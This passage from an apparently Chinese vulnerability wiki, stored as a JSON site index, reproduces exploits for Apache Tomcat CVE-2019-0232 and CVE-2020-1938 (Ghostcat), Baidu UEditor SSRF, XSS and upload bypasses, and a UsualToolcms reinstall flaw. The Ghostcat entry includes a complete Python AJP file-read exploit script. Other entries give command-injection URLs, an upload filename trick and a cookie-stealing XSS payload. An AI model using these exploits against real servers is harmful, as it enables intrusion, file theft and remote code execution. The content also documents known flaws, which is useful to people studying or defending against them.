因此漏洞的复现仅限于Tomcat启动后，在访问“/servlet1/”之前先访问了“/servlet1/servlet2/”页面，若之前存在任何人访问“/servlet1/*”页面，则漏洞不会触发。漏洞危害较高，但是利用条件困难，因此影响范围并不大。 参考链接 http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1305 http://blog.nsfocus.net/cve-2018-130-handling/ https://www.anquanke.com/post/id/99213 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-21 17:29:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Tomcat/CVE-2019-0232.html":{"url":"0day/Tomcat/CVE-2019-0232.html","title":"（CVE-2019-0232）Tomcat rce","keywords":"","body":"（CVE-2019-0232）Tomcat rce 一、漏洞简介 该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。 该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。 二、漏洞影响 Apache Tomcat 9.0.0.M1 to 9.0.17 Apache Tomcat 8.5.0 to 8.5.39 Apache Tomcat 7.0.0 to 7.0.93 三、复现过程 漏洞分析 漏洞相关的代码在 tomcat\\java\\org\\apache\\catalina\\servlets\\CGIServlet.java 中，CGIServlet提供了一个cgi的调用接口，在启用 enableCmdLineArguments 参数时，会根据RFC 3875来从Url参数中生成命令行参数，并把参数传递至Java的 Runtime 执行。 这个漏洞是因为 Runtime.getRuntime().exec 在Windows中和Linux中底层实现不同导致的。下面以一个简单的case来说明这个问题，在Windows下创建arg.bat： rem arg.bat echo %* 并执行如下的Java代码 String [] cmd={\"arg.bat\", \"arg\", \"&\", \"dir\"}; Runtime.getRuntime().exec(cmd); 在Windows下会输出 arg 和 dir 命令运行后的结果。同样的，用类似的脚本在Linux环境下测试： # arg.sh for key in \"$@\" do echo '$@' $key done String [] cmd={\"arg.sh\", \"arg\", \"&\", \"dir\"}; Runtime.getRuntime().exec(cmd); 此时的输出为 $@ arg $@ & $@ dir 导致这种输出的原因是在JDK的实现中 Runtime.getRuntime().exec 实际调用了 ProcessBuilder ，而后 ProcessBuilder 调用 ProcessImpl使用系统调用 vfork ，把所有参数直接传递至 execve。 用 strace -F -e vfork,execve java Main 跟踪可以看到上面的Java代码在Linux中调用为 execve(\"arg.sh\", [\"arg.sh\", \"arg\", \"&\", \"dir\"], [/* 23 vars */]) 而如果跟踪类似的PHP代码 system('a.sh arg & dir'); ，得到的结果为 execve(\"/bin/sh\", [\"sh\", \"-c\", \"a.sh arg & dir\"], [/* 23 vars */]) 所以Java的 Runtime.getRuntime().exec 在CGI调用这种情况下很难有命令注入。而Windows中创建进程使用的是 CreateProcess ，会将参数合并成字符串，作为 lpComandLine 传入 CreateProcess 。程序启动后调用 GetCommandLine 获取参数，并调用 CommandLineToArgvW 传至 argv。在Windows中，当 CreateProcess 中的参数为 bat 文件或是 cmd 文件时，会调用 cmd.exe , 故最后会变成 cmd.exe /c \"arg.bat & dir\"，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞。 除此之外，Windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过， 例如 dir \"\\\"&whoami\" 在Linux中是安全的，而在Windows会执行命令。 这是因为Windows在处理命令行参数时，会将 \" 中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 \" ，但是对 \\\" 的处理有误。同样用 arg.bat 做测试，可以发现这里只输出了 \\ 。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检查才能避免漏洞出现。 漏洞复现 笔者使用的复现环境为9.0.12 + JRE 1.8.0。 首先进行CGI相关的配置，在 conf/web.xml 中启用CGIServlet： cgi org.apache.catalina.servlets.CGIServlet cgiPathPrefix WEB-INF/cgi-bin enableCmdLineArguments true executable 5 这里主要的设置是 enableCmdLineArguments 和 executable 两个选项。 enableCmdLineArguments 启用后才会将Url中的参数传递到命令行， executable 指定了执行的二进制文件，默认是 perl，需要置为空才会执行文件本身。 同样在 conf/web.xml 中启用cgi的servlet-mapping cgi /cgi-bin/* 之后修改 conf/context.xml 的 ` 添加privileged=\"true\"`属性，否则会没有权限 WEB-INF/web.xml WEB-INF/tomcat-web.xml ${catalina.base}/conf/web.xml --> 然后在 ROOT\\WEB-INF 下创建 cgi-bin 目录, 并在该目录下创建一个内容为 echo Content-type: text/html 的 e.bat 文件。 配置完成后，启动tomcat，访问 http://0-sec.org:8080/cgi-bin/e.bat?&ver ，可以看到命令执行成功。 参考链接 https://xz.aliyun.com/t/4875 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-21 17:29:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Tomcat/CVE-2020-1938.html":{"url":"0day/Tomcat/CVE-2020-1938.html","title":"（CVE-2020-1938）Apache Tomcat 文件包含漏洞","keywords":"","body":"（CVE-2020-1938）Apache Tomcat 文件包含漏洞 一、漏洞简介 对于处在漏洞影响版本范围内的 Tomcat 而言，若其开启 AJP Connector 且攻击者能够访问 AJP Connector 服务端口的情况下，即存在被 Ghostcat 漏洞利用的风险。 注意 Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009 二、漏洞影响 Apache Tomcat 6 Apache Tomcat 7 Apache Tomcat 8 Apache Tomcat 9 三、复现过程 漏洞分析 由于 AJP 并不是一个 HTTP 业务流，走的是 Socket ，所以 tomcat 前面接收业务流的时候调用的是一个 Socket 解析类 SocketProcessorBase#dorun 来处理 ajp 传入的二进制流。 而后面这部分的数据流实际上都是 socket 内部进行流传处理。 这里需要感谢 tomcat 优雅的代码风格，可读性真强，和 socket 相关的 service 就下图里面的这些，所以AJP的业务流自然就落在了org/apache/coyote/ajp/AjpProcessor#service这个方法上面进行处理。 这org/apache/coyote/ajp/AjpProcessor#service这个方法里面就留两个关键部分，其他代码太繁杂了，无关大雅，这里首先this.prepareRequest()方法是针对整个业务流进行预处理。 Copy to clipboard public SocketState service(SocketWrapperBase socket) throws IOException { ... while(!this.getErrorState().isError() && !this.endpoint.isPaused()) { try { ... if (this.getErrorState().isIoAllowed()) { rp.setStage(2); try { this.prepareRequest(); } catch (Throwable var12) { ... if (this.getErrorState().isIoAllowed()) { try { rp.setStage(3); this.getAdapter().service(this.request, this.response); } ... } 跟进 prepareRequest 方法，这个方法会进行一个 while 为 true 的无限循环，根据attributeCode的结果进行选择，命中 case 10 核心中有个request.setAttribute(n, v)方法，这个方法会从我们之前设置方法中取值，设置，遍历循环POC中的javax.servlet.include.request_uri，javax.servlet.include.path_info，javax.servlet.include.servlet_path这三个属性对应的值，并且通过PUT方法进行赋值。 Copy to clipboard private void prepareRequest() { ... while(true) { byte attributeCode; while((attributeCode = this.requestHeaderMessage.getByte()) != -1) { switch(attributeCode) { ... case 10: ... } else { this.request.setAttribute(n, v); } break; 好了，这里知道了在 prepareRequest 方法中核心是将三个值动态赋予我们想要的结果，再回到org/apache/coyote/ajp/AjpProcessor#service中，在经过 prepareRequest 方法处理之后来到的就是getAdapter().service(this.request, this.response);，这个 serivce 就是后续处理 request 对象和 response 对象了。 在 org/apache/catalina/connector/CoyoteAdapter#service 这个类中，主要是设置一些连接的时候一些属性，然后通过 invoke 反射方法，根据 request 对象和 response 对象进入后面的HTTP处理逻辑。 所以又回到了前面的老话，tomcat完善的代码结构，HTTP的逻辑服务处理，自然是落在了 javax/servlet/http/HttpServlet#service 当中。 任意文件读取 前面是整个 AJP->HTTP 整个过程，继续往下跟入，因为通过 AJP 转换之后，进行的是 HTTP GET 请求，所以来到的自然是是下图中代码位置。 跟进 doGet 自然来到之前安恒通告说的地方。 继续跟入 serveResource，首先 getRelativePath 从之前传入的 request 对象中获取 path 。 跟进 getRelativePath ，一眼就知道为什么要设置 request_uri 、path_info 、servlet_path 这三个属性了，通过路径的拼接，最后返回的 servletPath 为/，容器内部为 /WEB-INF/web.xml 的文件内容。 继续回到 serveResource 方法中 getResource 根据前面的 path 也就是 /WEB-INF/web.xml 进行资源获取。而这里是没办法../出去的，原因继续往下看。 在 getResource 当中有个 validate ，这个检查往后走会调用 normalize 进行目录遍历的检查，之后就是输出读到的内容了。 由于当前 AJP 出不了 webapps 目录，但是是可以做到任意目录下读的，比如我需要读 /example/2.txt 下的文件，只需要这样配置就好了。 Copy to clipboard {'name':'req_attribute','value':['javax.servlet.include.request_uri','/examples']}, {'name':'req_attribute','value':['javax.servlet.include.path_info',2.txt]}, {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']}, ]) 附上任意文件读取的调用栈 Copy to clipboardserveResource:839, DefaultServlet (org.apache.catalina.servlets) doGet:504, DefaultServlet (org.apache.catalina.servlets) service:634, HttpServlet (javax.servlet.http) service:484, DefaultServlet (org.apache.catalina.servlets) service:741, HttpServlet (javax.servlet.http) internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) doFilter:52, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) invoke:199, StandardWrapperValve (org.apache.catalina.core) invoke:96, StandardContextValve (org.apache.catalina.core) invoke:493, AuthenticatorBase (org.apache.catalina.authenticator) invoke:137, StandardHostValve (org.apache.catalina.core) invoke:81, ErrorReportValve (org.apache.catalina.valves) invoke:660, AbstractAccessLogValve (org.apache.catalina.valves) invoke:87, StandardEngineValve (org.apache.catalina.core) service:343, CoyoteAdapter (org.apache.catalina.connector) service:476, AjpProcessor (org.apache.coyote.ajp) process:66, AbstractProcessorLight (org.apache.coyote) process:808, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1498, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1142, ThreadPoolExecutor (java.util.concurrent) run:617, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) RCE Copy to clipboard\"HTTP/1.1\" \"/1.jsp\" 127.0.0.1 localhost porto 8009 false \"Cookie:AAAA=BBBB\" \"javax.servlet.include.request_uri:/\",\"javax.servlet.include.path_info:1.txt\",\"javax.servlet.include.servlet_path:/upload/\" org/apache/jasper/servlet/JspServlet#service负责处理xxx.jsp访问逻辑，跟进来 jspUri 是通过 servlet_path 和 path_info 拼接而来的。 之后便会进入 serviceJspFile 逻辑进行处理。 跟进 serviceJspFile 方法，首先先通过 getResource 获取上传文件的内容，然后再通过初始化 wrapper 对象传入相关参数，然后再调用 JspServletWrapper#service 进行解析。 这简单解释一下，RCE 的核心需要进入的 JspServlet ，我们平常访问 xxx.jsp 是进入到 Jspservlet ，poc中访问/1.jsp通过 AJP 发包的过程中实际上就是我们的Get请求访问www.xxx.com/1.jsp，所以这里自然进入了 JspServlet 当中，然后再配合 getResource 获取上传的文件内容，调用 Jsp 引擎进行解析，自然达到了RCE的效果。 最后附上RCE的调用栈 Copy to clipboardexec:347, Runtime (java.lang) _jspService:1, _1_txt (org.apache.jsp) service:70, HttpJspBase (org.apache.jasper.runtime) service:741, HttpServlet (javax.servlet.http) service:476, JspServletWrapper (org.apache.jasper.servlet) serviceJspFile:386, JspServlet (org.apache.jasper.servlet) service:330, JspServlet (org.apache.jasper.servlet) service:741, HttpServlet (javax.servlet.http) internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) doFilter:52, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) invoke:199, StandardWrapperValve (org.apache.catalina.core) invoke:96, StandardContextValve (org.apache.catalina.core) invoke:493, AuthenticatorBase (org.apache.catalina.authenticator) invoke:137, StandardHostValve (org.apache.catalina.core) invoke:81, ErrorReportValve (org.apache.catalina.valves) invoke:660, AbstractAccessLogValve (org.apache.catalina.valves) invoke:87, StandardEngineValve (org.apache.catalina.core) service:343, CoyoteAdapter (org.apache.catalina.connector) service:476, AjpProcessor (org.apache.coyote.ajp) process:66, AbstractProcessorLight (org.apache.coyote) process:808, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1498, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1142, ThreadPoolExecutor (java.util.concurrent) run:617, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) 后话 我试了一下jsp的文件包含，这个demo下也是可以的，所以实际上RCE就是jsp的文件包含搞的鬼，要先上传一个文件，这个文件路径可被包含，然后读取模版解析，最后RCE。 Copy to clipboard//1.jsp //1.txt 另外前面可能有师傅会问为什么是GET，原因是下面这个POC有forwardrequest 2，根据AJP数据包格式第6个字节(02)代表是Get请求。另外在Tomcat中也有相关映射关系，在 AjpProcessor 做 prepareRequest 处理的时候会根据字节选择相关的请求方式。 poc (py27)> python .\\cve-2020-1938-poc.py -h usage: cve-2020-1938-poc.py [-h] [-p PORT] [-w WEBAPP] [-f FILE] [-l] target positional arguments: target Hostname or IP to attack optional arguments: -h, --help show this help message and exit -p PORT, --port PORT AJP port to attack (default is 8009) -w WEBAPP, --webapp WEBAPP Which webapp to attack (default is ROOT -f FILE, --file FILE file path :(WEB-INF/web.xml) -l, --lfi local file include python2.7 #!/usr/bin/env python # CNVD-2020-10487 Tomcat-Ajp lfi # Based on: https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/ # # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html import socket import struct import argparse def pack_string(s): if s is None: return struct.pack(\">h\", -1) l = len(s) return struct.pack(\">H%dsb\" % l, l, s.encode('utf8'), 0) def unpack(stream, fmt): size = struct.calcsize(fmt) buf = stream.read(size) return struct.unpack(fmt, buf) def unpack_string(stream): size, = unpack(stream, \">h\") if size == -1: # null string return None res, = unpack(stream, \"%ds\" % size) stream.read(1) # \\0 return res class NotFoundException(Exception): pass class AjpBodyRequest(object): # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) MAX_REQUEST_LENGTH = 8186 def __init__(self, data_stream, data_len, data_direction=None): self.data_stream = data_stream self.data_len = data_len self.data_direction = data_direction def serialize(self): data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH) if len(data) == 0: return struct.pack(\">bbH\", 0x12, 0x34, 0x00) else: res = struct.pack(\">H\", len(data)) res += data if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbH\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbH\", 0x41, 0x42, len(res)) return header + res def send_and_receive(self, socket, stream): while True: data = self.serialize() socket.send(data) r = AjpResponse.receive(stream) while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS: r = AjpResponse.receive(stream) if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4: break class AjpForwardRequest(object): _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range( 28) REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE} # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) COMMON_HEADERS = [\"SC_REQ_ACCEPT\", \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\", \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\", \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"] def __init__(self, data_direction=None): self.prefix_code = 0x02 self.method = None self.protocol = None self.req_uri = None self.remote_addr = None self.remote_host = None self.server_name = None self.server_port = None self.is_ssl = None self.num_headers = None self.request_headers = None self.attributes = None self.data_direction = data_direction def pack_headers(self): self.num_headers = len(self.request_headers) res = \"\" res = struct.pack(\">h\", self.num_headers) for h_name in self.request_headers: if h_name.startswith(\"SC_REQ\"): code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1 res += struct.pack(\"BB\", 0xA0, code) else: res += pack_string(h_name) res += pack_string(self.request_headers[h_name]) return res def pack_attributes(self): res = b\"\" for attr in self.attributes: a_name = attr['name'] code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1 res += struct.pack(\"b\", code) if a_name == \"req_attribute\": aa_name, a_value = attr['value'] res += pack_string(aa_name) res += pack_string(a_value) else: res += pack_string(attr['value']) res += struct.pack(\"B\", 0xFF) return res def serialize(self): res = \"\" res = struct.pack(\"bb\", self.prefix_code, self.method) res += pack_string(self.protocol) res += pack_string(self.req_uri) res += pack_string(self.remote_addr) res += pack_string(self.remote_host) res += pack_string(self.server_name) res += struct.pack(\">h\", self.server_port) res += struct.pack(\"?\", self.is_ssl) res += self.pack_headers() res += self.pack_attributes() if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbh\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbh\", 0x41, 0x42, len(res)) return header + res def parse(self, raw_packet): stream = StringIO(raw_packet) self.magic1, self.magic2, data_len = unpack(stream, \"bbH\") self.prefix_code, self.method = unpack(stream, \"bb\") self.protocol = unpack_string(stream) self.req_uri = unpack_string(stream) self.remote_addr = unpack_string(stream) self.remote_host = unpack_string(stream) self.server_name = unpack_string(stream) self.server_port = unpack(stream, \">h\") self.is_ssl = unpack(stream, \"?\") self.num_headers, = unpack(stream, \">H\") self.request_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code > 0xA000: h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001] else: h_name = unpack(stream, \"%ds\" % code) stream.read(1) # \\0 h_value = unpack_string(stream) self.request_headers[h_name] = h_value def send_and_receive(self, socket, stream, save_cookies=False): res = [] i = socket.sendall(self.serialize()) if self.method == AjpForwardRequest.POST: return res r = AjpResponse.receive(stream) assert r.prefix_code == AjpResponse.SEND_HEADERS res.append(r) if save_cookies and 'Set-Cookie' in r.response_headers: self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie'] # read body chunks and end response packets while True: r = AjpResponse.receive(stream) res.append(r) if r.prefix_code == AjpResponse.END_RESPONSE: break elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK: continue else: raise NotImplementedError break return res class AjpResponse(object): _, _, _, SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range( 7) COMMON_SEND_HEADERS = [ \"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\", \"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\" ] def parse(self, stream): # read headers self.magic, self.data_length, self.prefix_code = unpack(stream, \">HHb\") if self.prefix_code == AjpResponse.SEND_HEADERS: self.parse_send_headers(stream) elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK: self.parse_send_body_chunk(stream) elif self.prefix_code == AjpResponse.END_RESPONSE: self.parse_end_response(stream) elif self.prefix_code == AjpResponse.GET_BODY_CHUNK: self.parse_get_body_chunk(stream) else: raise NotImplementedError def parse_send_headers(self, stream): self.http_status_code, = unpack(stream, \">H\") self.http_status_msg = unpack_string(stream) self.num_headers, = unpack(stream, \">H\") self.response_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code H\") self.data = stream.read(self.data_length+1) def parse_end_response(self, stream): self.reuse, = unpack(stream, \"b\") def parse_get_body_chunk(self, stream): rlen, = unpack(stream, \">H\") return rlen @staticmethod def receive(stream): r = AjpResponse() r.parse(stream) return r def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET): fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER) fr.method = method fr.protocol = \"HTTP/1.1\" fr.req_uri = req_uri fr.remote_addr = target_host fr.remote_host = None fr.server_name = target_host fr.server_port = 80 fr.request_headers = { 'SC_REQ_ACCEPT': 'text/html', 'SC_REQ_CONNECTION': 'keep-alive', 'SC_REQ_CONTENT_LENGTH': '0', 'SC_REQ_HOST': target_host, 'SC_REQ_USER_AGENT': 'Mozilla', 'Accept-Encoding': 'gzip, deflate, sdch', 'Accept-Language': 'en-US,en;q=0.5', 'Upgrade-Insecure-Requests': '1', 'Cache-Control': 'max-age=0' } fr.is_ssl = False fr.attributes = [] return fr class Tomcat(object): def __init__(self, target_host, target_port): self.target_host = target_host self.target_port = target_port self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.connect((target_host, target_port)) self.stream = self.socket.makefile(\"rb\", bufsize=0) def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[], lfi=False): if lfi: self.req_uri = req_uri + '.jspx' else: self.req_uri = req_uri self.forward_request = prepare_ajp_forward_request( self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method)) print(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri)) if user is not None and password is not None: self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + ( \"%s:%s\" % (user, password)).encode('base64').replace('\\n', '') for h in headers: self.forward_request.request_headers[h] = headers[h] for a in attributes: self.forward_request.attributes.append(a) responses = self.forward_request.send_and_receive( self.socket, self.stream) if len(responses) == 0: return None, None snd_hdrs_res = responses[0] data_res = responses[1:-1] if len(data_res) == 0: print(\"No data in response. Headers:%s\\n\" % snd_hdrs_res.response_headers) return snd_hdrs_res, data_res parser = argparse.ArgumentParser() parser.add_argument(\"target\", type=str, help=\"Hostname or IP to attack\") parser.add_argument('-p', '--port', type=int, default=8009, help=\"AJP port to attack (default is 8009)\") parser.add_argument('-w', '--webapp', type=str, default='ROOT', help=\"Which webapp to attack (default is ROOT\") parser.add_argument('-f', '--file', type=str, default='WEB-INF/web.xml', help=\"file path :(WEB-INF/web.xml)\") parser.add_argument('-l', '--lfi', action=\"store_true\", help=\"local file include\") args = parser.parse_args() t = Tomcat(args.target, args.port) _, data = t.perform_request('/'+args.webapp+'/', attributes=[ {'name': 'req_attribute', 'value': [ 'javax.servlet.include.request_uri', '/']}, {'name': 'req_attribute', 'value': [ 'javax.servlet.include.path_info', args.file]}, {'name': 'req_attribute', 'value': [ 'javax.servlet.include.servlet_path', '/']}, ], lfi=args.lfi) print('----------------------------') print(\"\".join([d.data for d in data])) 参考链接 https://forum.90sec.com/t/topic/801 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-25 01:41:57 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Ueditor/1.html":{"url":"0day/Ueditor/1.html","title":"ueditor ssrf","keywords":"","body":"ueditor ssrf 一、漏洞简介 二、漏洞影响 三、复现过程 存在漏洞路径： /ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg /ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif /ueditor/php/controller.php?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif 存在就会抓取成功、也可以抓取外网的测试 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-01 16:10:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Ueditor/2.html":{"url":"0day/Ueditor/2.html","title":"ueditor 允许xml上传的xss漏洞","keywords":"","body":"ueditor 允许xml上传的xss漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 '\">\" xmlns:something=\"xss平台地址\">1234 Ueditor 默认支持上传 xml ：config.json可以查看支持上传的后缀 /ueditor/asp/config.json /ueditor/net/config.json /ueditor/php/config.json /ueditor/jsp/config.json 上传文件路径 /ueditor/index.html /ueditor/asp/controller.asp?action=uploadimage /ueditor/asp/controller.asp?action=uploadfile /ueditor/net/controller.ashx?action=uploadimage /ueditor/net/controller.ashx?action=uploadfile /ueditor/php/controller.php?action=uploadfile /ueditor/php/controller.php?action=uploadimage /ueditor/jsp/controller.jsp?action=uploadfile /ueditor/jsp/controller.jsp?action=uploadimage 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-01 16:30:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Ueditor/3.html":{"url":"0day/Ueditor/3.html","title":"ueditor .net版本上传漏洞","keywords":"","body":"ueditor .net版本上传漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 本地上传poc shell addr: 上传文件名为 1.gif;.aspx 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-01 16:32:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Ueditor/4.html":{"url":"0day/Ueditor/4.html","title":"百度ueditor编辑器 xss漏洞","keywords":"","body":"百度ueditor编辑器 xss漏洞 一、漏洞简介 产品官网下载地址： https://ueditor.baidu.com/website/download.html#mini 涉及版本：php , asp, jsp, net 二、漏洞影响 三、复现过程 漏洞分析 存在漏洞的文件： /php/getContent.php /asp/getContent.asp /jsp/getContent.jsp /net/getContent.ashx /php/getContent.php 入进行了过滤，但是在14行输出时却使用了htmlspecialchars_decode，造成XSS漏洞。 /asp/getContent.asp 获取myEditor参数无过滤，直接输出。 /jsp/getContent.jsp 获取myEditor参数无过滤，直接输出。 /net/getContent.ashx 获取myEditor参数无过滤，直接输出。 漏洞复现 php版本测试，其他版本一样。 url: http://0-sec.org/php/getcontent.php payload: myEditor=alert(document.cookie) // myEditor中的’ E ’必须大写，小写无效。 由于只是个反弹XSS，单独这个漏洞影响小。若能结合使用该编辑器的网站的其他漏洞使用，则可能产生不错的效果。 四、参考链接 https://blog.csdn.net/yun2diao/article/details/91381846 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 19:54:52 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/UsualToolcms/5.html":{"url":"0day/UsualToolcms/5.html","title":"UsualToolcms 8.0 系统重装漏洞","keywords":"","body":"UsualToolcms 8.0 系统重装漏洞 一、漏洞简介 无验证, 在安装cms完成后 并不会自动删除文件 又不会生成lock来判断是否安装过了。 导致了可以直接重装过 setup/index.php 安装地址 二、漏洞影响 UsualToolCMS大众版5.0 UsualToolcms 8.0 三、复现过程 alert('数据库设置成功!');window.location.href='?l=sql'\"; } if($t==\"testdb\"){ $dbhost=$_POST[\"dbhost\"]; $dbname=$_POST[\"dbname\"]; $dbuser=$_POST[\"dbuser\"]; $dbpass=$_POST[\"dbpass\"]; $mysqli=new mysqli($dbhost,$dbuser,$dbpass,$dbname); echo \"alert('测试完成!\".$mysqli->connect_error.\"');window.location.href='?l=sqlback'\"; } if($t==\"sqlback\"){ include('../sql_db.php'); $sqlcontent=$_POST['sqlcontent']; $res=$mysqli -> multi_query($sqlcontent); echo \"alert('数据库结构规划完成!');window.location.href='?l=setup'\"; } if($t==\"update\"){ include('../sql_db.php'); $authcode=$_POST[\"authcode\"];$webname=$_POST[\"webname\"]; $weblogo=$_POST[\"weblogo\"]; $weburl=$_POST[\"weburl\"]; $template=$_POST[\"template\"]; $webisclose=$_POST[\"webisclose\"]; $develop=$_POST[\"develop\"]; $articlelistnum=$_POST[\"articlelistnum\"]; $indexarticlenum=$_POST[\"indexarticlenum\"]; $indexarticlerenum=$_POST[\"indexarticlerenum\"]; $articlehitnum=$_POST[\"articlehitnum\"]; $goodslistnum=$_POST[\"goodslistnum\"]; $indexgoodsnum=$_POST[\"indexgoodsnum\"]; $indexgoodsrenum=$_POST[\"indexgoodsrenum\"]; $goodshitnum=$_POST[\"goodshitnum\"]; $article=$_POST[\"article\"]; $goods=$_POST[\"goods\"]; $messagebook=$_POST[\"messagebook\"]; $orders=$_POST[\"orders\"]; $members=$_POST[\"members\"]; $usercookname=$_POST[\"usercookname\"]; $sqls=\"INSERT INTO `cms_setup` (authcode,webname,weblogo,weburl,template,webisclose,develop,articlelistnum,indexarticlenum, indexarticlerenum,articlehitnum,goodslistnum,indexgoodsnum,indexgoodsrenum,goodshitnum,article,goods,messagebook,orders,members,usercookname,installtime) VALUES 